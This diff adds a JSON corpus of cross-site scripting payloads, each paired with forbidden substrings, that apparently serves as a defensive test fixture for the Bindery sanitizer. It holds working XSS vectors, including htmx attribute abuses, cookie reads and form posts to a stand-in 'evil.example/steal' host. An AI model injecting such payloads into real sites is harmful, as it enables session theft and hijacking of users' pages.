@@ -1,0 +1,238 @@
+{
+  "$comment": [
+    "Shared XSS corpus. Two consumers, one file:",
+    "  1. tests/conformance/checks_ui.py feeds each payload to a fragment plugin as user input",
+    "     and asserts the plugin does not reflect it back raw.",
+    "  2. tests/Bindery.Host.Tests/SanitizerTests.cs feeds each payload through Bindery's",
+    "     sanitizer and asserts every 'forbidden' substring is gone from the output.",
+    "'forbidden' matching is case-insensitive and substring-based. Adding an allowlist entry",
+    "to the sanitizer without adding a vector here is how this stops being a merge gate."
+  ],
+  "vectors": [
+    {
+      "name": "script-element",
+      "payload": "<script>alert(1)</script>",
+      "forbidden": ["<script", "alert(1)"]
+    },
+    {
+      "name": "script-src",
+      "payload": "<script src=\"https://evil.example/x.js\"></script>",
+      "forbidden": ["<script", "evil.example"]
+    },
+    {
+      "name": "img-onerror",
+      "payload": "<img src=x onerror=alert(1)>",
+      "forbidden": ["onerror", "alert(1)"]
+    },
+    {
+      "name": "svg-onload",
+      "payload": "<svg onload=alert(1)></svg>",
+      "forbidden": ["onload", "alert(1)"]
+    },
+    {
+      "name": "body-onload-fragment",
+      "payload": "<body onload=alert(1)>hi</body>",
+      "forbidden": ["onload", "<body"]
+    },
+    {
+      "name": "input-autofocus-onfocus",
+      "payload": "<input autofocus onfocus=alert(1)>",
+      "forbidden": ["onfocus", "alert(1)"]
+    },
+    {
+      "name": "href-javascript",
+      "payload": "<a href=\"javascript:alert(1)\">click</a>",
+      "forbidden": ["javascript:"]
+    },
+    {
+      "name": "href-javascript-mixed-case",
+      "payload": "<a href=\"jAvAsCrIpT:alert(1)\">click</a>",
+      "forbidden": ["javascript:"]
+    },
+    {
+      "name": "href-javascript-leading-space",
+      "payload": "<a href=\"   javascript:alert(1)\">click</a>",
+      "forbidden": ["javascript:"]
+    },
+    {
+      "name": "href-javascript-entity",
+      "payload": "<a href=\"java&#115;cript:alert(1)\">click</a>",
+      "forbidden": ["javascript:", "&#115;"]
+    },
+    {
+      "name": "href-javascript-tab",
+      "payload": "<a href=\"jav\tascript:alert(1)\">click</a>",
+      "forbidden": ["javascript:", "ascript:"]
+    },
+    {
+      "name": "href-data-html",
+      "payload": "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">x</a>",
+      "forbidden": ["data:text/html"]
+    },
+    {
+      "name": "img-data-svg",
+      "payload": "<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">",
+      "forbidden": ["data:image/svg"]
+    },
+    {
+      "name": "form-action-javascript",
+      "payload": "<form action=\"javascript:alert(1)\"><button>go</button></form>",
+      "forbidden": ["javascript:"]
+    },
+    {
+      "name": "style-element",
+      "payload": "<style>body{background:url('https://evil.example/x')}</style>",
+      "forbidden": ["<style", "evil.example"]
+    },
+    {
+      "name": "style-attribute-url",
+      "payload": "<div style=\"background:url(javascript:alert(1))\">x</div>",
+      "forbidden": ["javascript:", "background"]
+    },
+    {
+      "name": "style-attribute-expression",
+      "payload": "<div style=\"width:expression(alert(1))\">x</div>",
+      "forbidden": ["expression("]
+    },
+    {
+      "name": "iframe",
+      "payload": "<iframe src=\"https://evil.example/\"></iframe>",
+      "forbidden": ["<iframe", "evil.example"]
+    },
+    {
+      "name": "object",
+      "payload": "<object data=\"https://evil.example/x.swf\"></object>",
+      "forbidden": ["<object", "evil.example"]
+    },
+    {
+      "name": "embed",
+      "payload": "<embed src=\"https://evil.example/x.swf\">",
+      "forbidden": ["<embed", "evil.example"]
+    },
+    {
+      "name": "link-stylesheet",
+      "payload": "<link rel=\"stylesheet\" href=\"https://evil.example/x.css\">",
+      "forbidden": ["<link", "evil.example"]
+    },
+    {
+      "name": "meta-refresh",
+      "payload": "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example/\">",
+      "forbidden": ["<meta", "evil.example"]
+    },
+    {
+      "name": "base-tag",
+      "payload": "<base href=\"https://evil.example/\">",
+      "forbidden": ["<base", "evil.example"]
+    },
+    {
+      "name": "form-hijack-target",
+      "payload": "<form action=\"https://evil.example/steal\" method=\"post\"><input name=\"x\"></form>",
+      "forbidden": ["evil.example"]
+    },
+    {
+      "name": "noscript-mxss",
+      "payload": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">x</p></noscript>",
+      "forbidden": ["onerror", "alert(1)"]
+    },
+    {
+      "name": "template-script",
+      "payload": "<template><script>alert(1)</script></template>",
+      "forbidden": ["<script", "alert(1)"]
+    },
+    {
+      "name": "textarea-breakout",
+      "payload": "<textarea></textarea><script>alert(1)</script>",
+      "forbidden": ["<script", "alert(1)"]
+    },
+    {
+      "name": "conditional-comment",
+      "payload": "<!--[if IE]><script>alert(1)</script><![endif]-->",
+      "forbidden": ["<script", "alert(1)"]
+    },
+    {
+      "name": "event-attribute-on-allowed-element",
+      "payload": "<div class=\"bnd-card\" onmouseover=\"alert(1)\">x</div>",
+      "forbidden": ["onmouseover", "alert(1)"]
+    },
+    {
+      "name": "htmx-hx-on-colon",
+      "payload": "<button hx-on:click=\"alert(1)\">x</button>",
+      "forbidden": ["hx-on", "alert(1)"]
+    },
+    {
+      "name": "htmx-hx-on-legacy",
+      "payload": "<button hx-on=\"click: alert(1)\">x</button>",
+      "forbidden": ["hx-on", "alert(1)"]
+    },
+    {
+      "name": "htmx-hx-on-htmx-event",
+      "payload": "<div hx-on::after-request=\"alert(1)\">x</div>",
+      "forbidden": ["hx-on", "alert(1)"]
+    },
+    {
+      "name": "htmx-vals-js",
+      "payload": "<div hx-get=\"/x\" hx-vals=\"js:{a:alert(1)}\">x</div>",
+      "forbidden": ["js:", "alert(1)"]
+    },
+    {
+      "name": "htmx-headers-js",
+      "payload": "<div hx-get=\"/x\" hx-headers=\"js:{a:document.cookie}\">x</div>",
+      "forbidden": ["js:", "document.cookie"]
+    },
+    {
+      "name": "htmx-cross-origin-get",
+      "payload": "<div hx-get=\"https://evil.example/x\" hx-trigger=\"load\">x</div>",
+      "forbidden": ["evil.example"]
+    },
+    {
+      "name": "htmx-cross-origin-post",
+      "payload": "<form hx-post=\"https://evil.example/steal\"><input name=\"x\"></form>",
+      "forbidden": ["evil.example"]
+    },
+    {
+      "name": "htmx-headers-override-csrf",
+      "payload": "<form hx-post=\"/plugins/p/ui/x\" hx-headers='{\"X-CSRF-TOKEN\":\"forged\"}'></form>",
+      "forbidden": ["forged"]
+    },
+    {
+      "name": "htmx-select-oob-shell-hijack",
+      "payload": "<div hx-swap-oob=\"innerHTML:#bnd-nav\">gone</div>",
+      "forbidden": ["hx-swap-oob"]
+    },
+    {
+      "name": "srcdoc-iframe",
+      "payload": "<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>",
+      "forbidden": ["<iframe", "srcdoc"]
+    },
+    {
+      "name": "xml-namespace-script",
+      "payload": "<xml:namespace prefix=\"t\"><t:script>alert(1)</t:script>",
+      "forbidden": ["script", "alert(1)"]
+    },
+    {
+      "name": "marquee-onstart",
+      "payload": "<marquee onstart=alert(1)>x</marquee>",
+      "forbidden": ["onstart", "alert(1)"]
+    },
+    {
+      "name": "details-ontoggle",
+      "payload": "<details open ontoggle=alert(1)><summary>x</summary></details>",
+      "forbidden": ["ontoggle", "alert(1)"]
+    },
+    {
+      "name": "video-onerror",
+      "payload": "<video><source onerror=\"alert(1)\"></video>",
+      "forbidden": ["onerror", "alert(1)"]
+    },
+    {
+      "name": "formaction-javascript",
+      "payload": "<form><button formaction=\"javascript:alert(1)\">go</button></form>",
+      "forbidden": ["javascript:"]
+    },
+    {
+      "name": "id-collision-with-shell",
+      "payload": "<div id=\"bnd-nav\">replaced</div>",
+      "forbidden": ["\"bnd-nav\"", "'bnd-nav'"]
+    }
+  ]
+}
